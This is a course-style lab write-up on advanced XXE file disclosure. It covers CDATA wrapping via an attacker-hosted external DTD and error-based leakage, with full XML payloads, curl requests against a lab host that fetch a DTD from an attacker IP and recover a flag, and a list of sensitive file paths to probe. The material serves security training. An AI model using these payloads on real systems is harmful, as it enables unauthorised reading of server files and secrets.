# Section 15 — Advanced File Disclosure (XXE)

When basic XXE fails — because the file content breaks the XML parser, or because the app doesn't reflect input — two techniques recover:

| Technique | When to use |
|-----------|-------------|
| **CDATA wrapping via parameter entities** | Reflection works, but file contains XML metacharacters (`<`, `>`, `&`) |
| **Error-based exfiltration** | No reflection, but server returns verbose parse errors |

Both rely on an attacker-controlled **external DTD** hosted on your machine, because parameter entities (`%`-prefixed) can only be concatenated when they all come from an external context.

---

## Technique 1 — CDATA via External DTD

### Why basic XXE fails on source files
`file:///var/www/html/index.php` → the parser tries to inline `<?php ... ?>` directly into the document. The first `<` not part of valid markup terminates the entity expansion. Result: empty output.

`php://filter/convert.base64-encode` solves this for PHP — but only PHP. For Java/Python/Node/Ruby targets, you need CDATA.

### The CDATA primitive

XML `<![CDATA[ ... ]]>` blocks are treated as raw character data — the parser doesn't interpret anything inside. So wrapping the file content in CDATA lets you smuggle XML metacharacters through.

### Why you need an external DTD

This naive approach DOES NOT WORK:
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///path">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
XML forbids concatenating internal + external entities in this way.

The bypass: use **parameter entities** (`%name`), which can only appear inside DTDs. When all participating entities come from an external DTD context, the parser allows concatenation.

### Step-by-step

**1. Write the DTD file** on your machine:
```bash
mkdir -p /tmp/xxe && cd /tmp/xxe
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

**2. Host it**:
```bash
python3 -m http.server 8000
```

**3. Send the XXE payload** to the target, defining `%begin`, `%file`, `%end` locally, then including the external DTD which defines `&joined;`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file  SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end   "]]>">
  <!ENTITY % xxe   SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %xxe;
]>
<root>
  <name>x</name>
  <tel>1</tel>
  <email>&joined;</email>
  <message>m</message>
</root>
```

**4. Read the file content** from the reflected `<email>` value.

### Why this works step by step
```
1. Parser reads DOCTYPE → defines %begin, %file, %end as parameter entities
2. Parser hits %xxe; → fetches your DTD → reads <!ENTITY joined "%begin;%file;%end;">
3. In the external DTD context, parameter entity concatenation IS allowed
4. The parser builds &joined; = "<![CDATA[" + file_content + "]]>"
5. <email>&joined;</email> expands → output is CDATA-wrapped file content
6. Server echoes <email> value → file content visible
```

### Self-reference gotcha
Modern parsers reject reading the same file the parser is currently processing (e.g., `index.php` reading `index.php`). This is a DoS protection. Workaround: read a different file, or use the error-based method below.

---

## Technique 2 — Error-Based XXE

When the app **doesn't reflect** XML data back but **does** show verbose errors (PHP errors, Java stacktraces, .NET exception pages), you can exfiltrate file contents in the error message.

### The trick

The XML spec says: entity definitions referencing a SYSTEM URI must be syntactically valid URIs. If we craft an URI that's intentionally invalid AND embeds a file's content, the parse error usually contains the broken URI verbatim — leaking the file.

### The DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
%error;
```

Reading top-down:
- `%file` = contents of `/etc/hosts` (parameter entity, expanded only inside DTD)
- `%error` = a NEW entity definition that uses `%nonExistingEntity;` (undefined → parse error) and embeds `%file;` (the file content)
- Invoking `%error;` triggers parse error; error message contains the file content

### The request payload

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
<root><email>x</email></root>
```

The response will contain an error like:
```
Warning: simplexml_load_string(): file:///etc/hosts:1: parser error :
StartTag: invalid element name
```
…with the file's content embedded.

### Tradeoffs vs CDATA

| Aspect | CDATA method | Error-based |
|--------|--------------|-------------|
| Requires reflection? | Yes | No (just needs verbose errors) |
| Output length | Unlimited | Truncated at error message limit |
| Special chars | All allowed | Some chars may still abort parsing |
| Reliability | High | Lower — error format varies by parser |

---

## Lab — Read `/flag.php`

**Target:** `10.129.98.124`
**Attacker IP (tun0):** check with `myip` — for this run it was `10.10.17.176`

### 1. Host the DTD
```bash
mkdir -p /tmp/xxe && cd /tmp/xxe
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000 &
```

### 2. Try the documented path first (failed)
```bash
curl -sk -X POST http://10.129.98.124/submitDetails.php \
  -H "Content-Type: application/xml" \
  --data $'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE email [\n<!ENTITY % begin "<![CDATA[">\n<!ENTITY % file SYSTEM "file:///var/www/html/flag.php">\n<!ENTITY % end "]]>">\n<!ENTITY % xxe SYSTEM "http://10.10.17.176:8000/xxe.dtd">\n%xxe;\n]>\n<root><name>x</name><tel>1</tel><email>&joined;</email><message>m</message></root>'
# → empty body — flag.php not at /var/www/html/
```

DTD log shows the server DID fetch xxe.dtd, so the chain is wired correctly — the file path was just wrong.

### 3. Try filesystem root
```bash
curl -sk -X POST http://10.129.98.124/submitDetails.php \
  -H "Content-Type: application/xml" \
  --data $'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE email [\n<!ENTITY % begin "<![CDATA[">\n<!ENTITY % file SYSTEM "file:///flag.php">\n<!ENTITY % end "]]>">\n<!ENTITY % xxe SYSTEM "http://10.10.17.176:8000/xxe.dtd">\n%xxe;\n]>\n<root><name>x</name><tel>1</tel><email>&joined;</email><message>m</message></root>'
```

Response:
```
Check your email <?php $flag = "HTB{3rr0r5_c4n_l34k_d474}"; ?>
 for further instructions.
```

**Flag:** `HTB{3rr0r5_c4n_l34k_d474}`

### Note on file location
The lab placed `flag.php` at `/flag.php` (filesystem root), not at the web root. When CDATA returns an empty `<email>` field, try **other paths** — the chain is working; the path is wrong. Common locations to try:
```
/flag                    /flag.txt              /flag.php
/root/flag.txt           /home/<user>/flag.txt
/var/www/flag.php        /var/www/html/flag.php
/tmp/flag                /opt/flag
```

---

## Path Discovery Helpers

Once you have basic file-read primitive, look for paths via:

```bash
# Apache vhost config — reveals DocumentRoot
file:///etc/apache2/sites-enabled/000-default.conf
file:///etc/apache2/apache2.conf
file:///etc/nginx/sites-enabled/default
file:///etc/nginx/nginx.conf

# Generic
file:///proc/self/cwd/index.php   ← reads from process's working dir
file:///proc/self/cmdline         ← reveals binary path and args
file:///proc/self/environ         ← env vars (DOCUMENT_ROOT, etc.)

# PHP-specific
file:///proc/self/cwd/config.php
```

`/proc/self/cwd/X` is especially useful — it resolves to whatever directory the web process was started in, without you needing to know the path.

---

## When Even Error-Based Fails

If the app shows neither output nor errors → fully **blind XXE**. Then you need **out-of-band (OOB)** exfiltration: smuggle data via DNS lookups or HTTP requests to your server. Covered in Section 16.

---

## Exam Notes

- **Parameter entities (`%name`) are XXE's killer feature** — they let you concatenate file content with literals when invoked through an external DTD
- The `xxe.dtd` one-liner `<!ENTITY joined "%begin;%file;%end;">` is the core CDATA primitive — memorize
- Error-based works when the app shows parser errors but doesn't reflect input — invalid URI `%nonExistingEntity;/%file;` smuggles file content into the error message
- **Always test with /etc/hosts or /etc/passwd first** — confirms the chain works before hunting for app-specific files
- Verify your DTD is being fetched by watching the python http.server logs — silent failure means your callback IP/port is wrong
- Flag file locations vary — when the documented path returns empty, the chain is working; just brute-force common paths
- For non-PHP targets (Java, Python), `php://filter` is unavailable — CDATA is your only practical source-disclosure route
